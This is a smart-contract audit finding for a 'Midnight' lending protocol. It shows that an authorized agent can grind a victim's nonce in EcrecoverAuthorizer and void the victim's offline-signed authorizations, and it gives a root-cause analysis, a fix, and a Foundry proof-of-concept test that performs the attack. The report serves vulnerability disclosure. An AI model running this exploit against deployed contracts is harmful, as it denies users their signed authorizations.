### Title
Authorized agent can grind victim's nonce in `EcrecoverAuthorizer` to invalidate all pending pre-signed authorizations - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` accepts a signature from any address that `Midnight.isAuthorized` recognises as an agent of the authorizer, not only the authorizer's own key. An attacker who already holds on-chain authorization from the victim can sign and submit an unlimited sequence of no-op re-authorizations of themselves, each consuming one nonce slot, at the cost of gas only. Every pre-signed authorization the victim distributed offline with a nonce below the attacker's final count becomes permanently unreplayable.

### Finding Description
**Code path.**

`EcrecoverAuthorizer.setIsAuthorized` (lines 24-48, `src/periphery/EcrecoverAuthorizer.sol`):

```
require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce()); // line 26
...
require(
    signer == authorization.authorizer
        || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer), // line 33-36
    Unauthorized()
);
IMidnight(MIDNIGHT).setIsAuthorized(
    authorization.authorized, authorization.isAuthorized, authorization.authorizer); // line 46-47
``` [1](#0-0) [2](#0-1) 

**Root cause.** The nonce is keyed on `authorization.authorizer` (the victim), but the signature check accepts any signer for whom `IMidnight.isAuthorized(victim, signer)` is true. There is no requirement that the signer be the authorizer themselves. The nonce is incremented unconditionally before the signature is verified, so every successful call — including a no-op — advances the victim's nonce by one. [3](#0-2) 

**Attacker-controlled inputs.**
- `authorization.authorizer` = victim address
- `authorization.authorized` = attacker address
- `authorization.isAuthorized` = `true` (no-op; attacker is already authorized)
- `authorization.nonce` = current `nonce[victim]` (incremented each call)
- `authorization.deadline` = any future timestamp
- `signature` = attacker's own ECDSA signature over the struct

**Exploit flow (N iterations).**

Preconditions:
1. Victim has authorised `EcrecoverAuthorizer` on Midnight: `isAuthorized[victim][ecrecoverAuthorizer] == true` (required for the contract to function at all).
2. Attacker holds on-chain authorization from victim: `isAuthorized[victim][attacker] == true`.

For `i = 0 … N-1`:
1. Attacker constructs `Authorization(authorizer=victim, authorized=attacker, isAuthorized=true, nonce=i, deadline=future)`.
2. Attacker signs the EIP-712 digest with their own private key → `signer = attacker`.
3. Attacker calls `EcrecoverAuthorizer.setIsAuthorized(auth, sig)`.
4. Line 25: deadline check passes.
5. Line 26: `i == nonce[victim]` → passes; `nonce[victim]` becomes `i+1`.
6. Lines 33-36: `attacker == victim` → false; `isAuthorized[victim][attacker]` → true → passes.
7. Line 47: `Midnight.setIsAuthorized(attacker, true, victim)` → no-op write.

After N calls: `nonce[victim] == N`. Every pre-signed authorization the victim distributed with nonce `< N` reverts with `InvalidNonce()`. [4](#0-3) [5](#0-4) 

**Why existing checks fail.** The `Unauthorized` guard is satisfied by the attacker's own signature because the delegation branch (`isAuthorized(victim, attacker)`) is true. The nonce check only enforces sequential ordering; it does not restrict who may consume nonce slots. There is no check that the signer must equal `authorization.authorizer`. [2](#0-1) 

### Impact Explanation
All pending pre-signed authorizations the victim has distributed offline (for `take`, `repay`, `withdraw`, `withdrawCollateral`, `liquidate`, `setConsumed`, or any other action gated on `isAuthorized`) become permanently invalid. Counterparties holding those signatures cannot execute them; the victim must re-sign and redistribute every authorization, and the attacker can immediately repeat the attack. This is a sustained, low-cost denial-of-service against every signature-based action in the protocol.

### Likelihood Explanation
**Preconditions:** The victim must have (a) authorised `EcrecoverAuthorizer` on Midnight and (b) authorised the attacker on Midnight. Both are normal operational states for any user who relies on the signature-based authorization flow. The attacker needs no capital, no special role, and no privileged access beyond the on-chain authorization the victim already granted. The attack is repeatable indefinitely as long as the attacker's authorization is not revoked, and the attacker can front-run any revocation attempt.

### Recommendation
Remove the delegation branch from the signer check. Only the authorizer's own key should be permitted to consume nonce slots:

```solidity
require(signer == authorization.authorizer, Unauthorized());
```

If meta-transaction submission by third parties is desired (so anyone can relay a victim-signed message), the caller restriction should be on `msg.sender` only for relaying, while the cryptographic check must remain strictly `signer == authorization.authorizer`. The current design conflates "who may relay" with "who may sign", which is the root of the vulnerability. [2](#0-1) 

### Proof of Concept
```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {EcrecoverAuthorizerTest} from "./SetIsAuthorizedWithSigTest.sol";
import {Authorization, Signature, AUTHORIZATION_TYPEHASH, EIP712_DOMAIN_TYPEHASH}
    from "../src/periphery/interfaces/IEcrecoverAuthorizer.sol";

contract NonceGrindPoC is EcrecoverAuthorizerTest {
    function testNonceGrind(uint8 n) public {
        n = uint8(bound(n, 1, 50));

        // Setup: victim authorizes EcrecoverAuthorizer and attacker on Midnight.
        vm.startPrank(borrower); // borrower = victim
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, borrower);
        midnight.setIsAuthorized(otherLender, true, borrower); // otherLender = attacker
        vm.stopPrank();

        // Victim pre-signs N authorizations offline (nonces 0..N-1).
        Authorization[] memory victimAuths = new Authorization[](n);
        Signature[]     memory victimSigs  = new Signature[](n);
        for (uint8 i = 0; i < n; i++) {
            victimAuths[i] = Authorization({
                authorizer:   borrower,
                authorized:   lender,
                isAuthorized: true,
                nonce:        i,
                deadline:     block.timestamp + 1 days
            });
            victimSigs[i] = signAuthorization(victimAuths[i], borrower);
        }

        // Attacker grinds nonce[victim] to N using no-op self-reauthorizations.
        vm.startPrank(otherLender); // attacker submits
        for (uint8 i = 0; i < n; i++) {
            bytes32 structHash = keccak256(abi.encode(AUTHORIZATION_TYPEHASH,
                Authorization({
                    authorizer:   borrower,
                    authorized:   otherLender,
                    isAuthorized: true,
                    nonce:        i,
                    deadline:     block.timestamp + 1 days
                })
            ));
            bytes32 domainSep = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH,
                block.chainid, address(ecrecoverAuthorizer)));
            bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSep, structHash));
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey[otherLender], digest);

            ecrecoverAuthorizer.setIsAuthorized(
                Authorization({
                    authorizer:   borrower,
                    authorized:   otherLender,
                    isAuthorized: true,
                    nonce:        i,
                    deadline:     block.timestamp + 1 days
                }),
                Signature({v: v, r: r, s: s})
            );
        }
        vm.stopPrank();

        // Assert: nonce[victim] == N
        assertEq(ecrecoverAuthorizer.nonce(borrower), n);

        // Assert: all victim's pre-signed authorizations revert with InvalidNonce
        for (uint8 i = 0; i < n; i++) {
            vm.expectRevert(IEcrecoverAuthorizer.InvalidNonce.selector);
            ecrecoverAuthorizer.setIsAuthorized(victimAuths[i], victimSigs[i]);
        }
    }
}
```

Expected assertions: `nonce[victim] == N` after the grind loop; every victim pre-signed call reverts `InvalidNonce`. The fuzz bound on `n` can be raised to confirm the attack scales linearly with attacker gas budget. [6](#0-5) [3](#0-2)

### Citations

**File:** src/periphery/EcrecoverAuthorizer.sol (L24-48)
```text
    function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
        require(block.timestamp <= authorization.deadline, Expired());
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
        address signer = ecrecover(digest, signature.v, signature.r, signature.s);
        require(signer != address(0), InvalidSignature());
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );

        emit SetIsAuthorized(
            msg.sender,
            authorization.authorizer,
            authorization.authorized,
            authorization.isAuthorized,
            authorization.nonce
        );

        IMidnight(MIDNIGHT)
            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
    }
```

**File:** src/Midnight.sol (L731-735)
```text
    function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        isAuthorized[onBehalf][authorized] = newIsAuthorized;
        emit EventsLib.SetIsAuthorized(msg.sender, authorized, newIsAuthorized, onBehalf);
    }
```

**File:** test/SetIsAuthorizedWithSigTest.sol (L117-132)
```text
    function testEcrecoverAuthorizerNonce(uint8 n) public {
        vm.prank(borrower);
        midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, borrower);
        n = uint8(bound(n, 1, 32));

        for (uint8 i = 0; i < n; i++) {
            bool isAuth = i % 2 == 0;
            Authorization memory auth = makeAuthorization(borrower, lender, isAuth);
            Signature memory sig = signAuthorization(auth, borrower);

            ecrecoverAuthorizer.setIsAuthorized(auth, sig);

            assertEq(ecrecoverAuthorizer.nonce(borrower), i + 1);
            assertEq(midnight.isAuthorized(borrower, lender), isAuth);
        }
    }
```
